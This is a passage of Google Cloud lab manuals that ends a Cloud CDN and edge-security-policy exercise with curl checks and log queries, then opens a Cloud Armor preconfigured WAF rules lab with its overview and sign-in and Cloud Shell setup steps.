following command, which gives you a 403:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://LOAD_BALANCER_IP/google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>A 403 error occurs when you do not have permission to accessing a web page or something on a web server.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://34.98.81.123/google.png</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* &nbsp; Trying 34.98.81.123...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* TCP_NODELAY set</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; GET /google.png HTTP/1.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Host: YOUR_IP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; User-Agent: curl/7.64.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; Accept: */*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; HTTP/1.1 403 Forbidden</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; X-GUploader-UploadID: ADPycdtS6FtJOGIsiWYDrAAE8VFeQuNutcvbGoQe2t8EZxsuspVtmCjyiTv_P3CNktroHMOGFXkTCfG-Jj-rUO60ZGPpEbpqcw</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Type: application/xml; charset=UTF-8</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Content-Length: 111</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Date: Mon, 13 Dec 2021 23:09:35 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Expires: Mon, 13 Dec 2021 23:09:35 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Cache-Control: private, max-age=0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt; Server: UploadServer</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 405px;"></div><div class="CodeMirror-gutters" style="display: none; height: 405px;"></div></div></div></pre><h5 id='investigate-the-logs-2'><span>Investigate the logs</span></h5><p><span>Next, you check the logs to see the enforced edge security policy.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Observability &gt; Logging &gt; Logs Explorer</span></strong><span>.</span></p></li><li><p><span>Enter the below snippet into the query box and click </span><strong><span>Run Query</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resource.type:(http_load_balancer) AND jsonPayload.@type="type.googleapis.com/google.cloud.loadbalancing.type.LoadBalancerLogEntry" AND severity&gt;=WARNING</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Note the </span><code>403 response</code><span> and the enforced security policy.</span></p></li></ol><p><img src="images\6oLMK5C%2FszEFTgZb1VOEtFb4z%2BQr%2FFb470LXgCZ5Y8c%3D" referrerpolicy="no-referrer" alt="The Query page, which includes the highlighted 403 response message and its security policy"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create edge security policy for cloud Armor</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='remove-the-security-policy-2'><span>Remove the security policy</span></h4><p><span>To prove that the object is getting delivered from the CDN cache, remove the Cloud Armor security policy and query the object. The origin object has been removed from Cloud Storage, thus illustrating that the object is getting served from the edge cache.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>View All Products &gt; Network Security &gt; Cloud Armor policies &gt; edge-security-policy &gt; Targets</span></strong><span>.</span></p></li><li><p><span>Select the </span><code>lb-backend-bucket</code><span> target and click </span><strong><span>Remove</span></strong><span> to remove the target bucket. Confirm </span><strong><span>Remove</span></strong><span>.</span></p></li><li><p><span>Wait a few minutes, then send another </span><code>curl</code><span> to the resource in the Cloud Storage bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -svo /dev/null http://LOAD_BALANCER_IP/google.png</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You get a </span><code>200</code><span> response this time. The web page is acting as it is supposed to.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-cloudshell% curl -svo /dev/null http://34.98.81.123/google.png</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Trying 34.98.81.123...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> TCP_NODELAY set</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> GET /google.png HTTP/1.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Host: YOUR_IP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> User-Agent: curl/7.64.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Accept: */*</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  HTTP/1.1 200 OK</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  X-GUploader-UploadID: ADPycdtI7f49P3MSuZSZ8vl6RwfwmnIDJ59EeSKp7UPvLPawdaiRHXiNWLtseQTxUxceWOvSLvpYmT3pWVkV4qeIP7M</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Date: Mon, 13 Dec 2021 23:06:46 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ETag: "8f9327db2597fa57d2f42b4a6c5a9855"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-generation: 1639431957957903</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-metageneration: 2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-stored-content-encoding: identity</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-stored-content-length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Content-Type: image/png</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-hash: crc32c=TeiHTA==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  x-goog-storage-class: STANDARD</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Accept-Ranges: bytes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Content-Length: 5969</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Server: UploadServer</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Age: 1621</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Cache-Control: public,max-age=3600</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> { [775 bytes data]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Connection #0 to host 34.98.81.123 left intact</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> Closing connection 0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 720px;"></div><div class="CodeMirror-gutters" style="display: none; height: 720px;"></div></div></div></pre><p><span>Try it a couple of times and see if you get a 403 status code.</span></p><h3 id='congratulations-24'><span>Congratulations!</span></h3><p><span>You have successfully created a Cloud Storage bucket, uploaded an image to it, bound it to a load balancer, and then enabled Cloud CDN and edge security policies on it.</span></p><p><strong><span>Manual Last Updated December 10, 2024</span></strong></p><p><strong><span>Lab Last Tested December 10, 2024</span></strong></p><h2 id='lab---cloud-armor-preconfigured-waf-rules'><span>LAB - Cloud Armor Preconfigured WAF Rules</span></h2><h2 id='overview-28'><span>Overview</span></h2><p><span>Google Cloud Armor is Google&#39;s enterprise edge network security solution providing DDOS protection, WAF rule enforcement, and adaptive manageability at scale.</span></p><p><span>Cloud Armor has extended the preconfigured WAF rule sets to mitigate against the </span><a href='https://owasp.org/www-project-top-ten/'><span>OWASP Top 10</span></a><span> web application security vulnerabilities. The rule sets are based on the </span><a href='https://github.com/coreruleset/coreruleset/'><span>OWASP Modsecurity core rule set</span></a><span> version 3.0.2 to protect against some of the most common web application security risks including local file inclusion (lfi), remote file inclusion (rfi), remote code execution (rce), and many more.</span></p><p><span>In this lab, you learn how to mitigate some of the common vulnerabilities by using Google Cloud Armor WAF rules.</span></p><h3 id='what-youll-learn-5'><span>What you&#39;ll learn</span></h3><p><span>In this lab, you learn how to:</span></p><ul><li><p><span>Set up an Instance Group and a Global Load Balancer to support a service</span></p></li><li><p><span>Configure Cloud Armor security policies with preconfigured WAF rules to protect against lfi, rce, scanners, protocol attacks, and session fixation</span></p></li><li><p><span>Validate that Cloud Armor mitigated an attack by observing logs</span></p></li></ul><p><img src="images\o0nzl9C1wJu%2BsjiNEXZ3Knl7hCB2cDCI%2BsYq56mGIGM%3D" referrerpolicy="no-referrer" alt="Cloud Armor WAF rules topology"></p><p><span>The </span><a href='https://owasp.org/www-project-juice-shop/'><span>OWASP Juice Shop application</span></a><span> is useful for security training and awareness, because it contains instances of each of the OWASP Top 10 security vulnerabilities—by design. An attacker can exploit it for testing purposes. In this lab, you use it to demonstrate some application attacks followed by protecting the application with Cloud Armor WAF rules. The application is fronted by a Google Cloud Load Balancer, onto which the Cloud Armor security policy and rules are be applied. It is served on the public internet thus reachable from almost anywhere and protected using Cloud Armor and VPC firewall rules.</span></p><h2 id='setup-and-requirements-25'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-11'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-7'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Username"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h3 id='activate-cloud-shell-2'><span>Activate Cloud Shell</span></h3><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>PROJECT_ID</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to "PROJECT_ID"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; 